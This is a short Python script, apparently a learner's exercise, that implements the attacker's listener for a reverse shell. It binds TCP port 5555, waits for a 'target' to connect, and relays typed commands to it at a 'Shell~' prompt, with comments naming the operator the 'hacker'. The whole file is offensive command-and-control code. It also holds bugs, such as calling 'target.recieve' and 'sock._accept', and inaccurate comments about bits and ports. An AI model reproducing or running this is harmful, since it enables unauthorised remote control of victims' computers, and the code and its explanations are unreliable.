import socket
import json
import os

def send(data):
	jsondata = json.dumps(data)
	target.send(jsondata.encode()) # here, the data is eocoded transfered

def recieve():
	data = ""
	while True:
		try:
			data = data+ target.recieve(1024).decode().rstrip()
			""" here 1024 = bits of the data that is to be recieved
			.decode() is to deocde the encoded data
			.rstrip removes extra spaces input by mistake
			"""
			return json.loads(data)
		except ValueError:
			continue


def target_communication():
	while True: # this is the initiation for the hacker to start contacting  the target
		command = input (" Shell~%s: " % str(ip_addr))
		send(command)
		if command == "quit": # if hacker wants to exit the shell
			break
		elif command[:3] == "cd ":
			pass
		else:
			result = recieve()
			print(result)


sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # AF_INET tells the connection is IPV4 and  socket.sock STREAM tells the connection is TCP
sock.bind(("0.0.0.0", 5555)) #here bind listens on IP given , port no.
print(" Listening ")
sock.listen(5) # max. 5 ports to listen
target, ip_addr = sock._accept()
print(" Target is connected from : ", ip_addr)
target_communication()
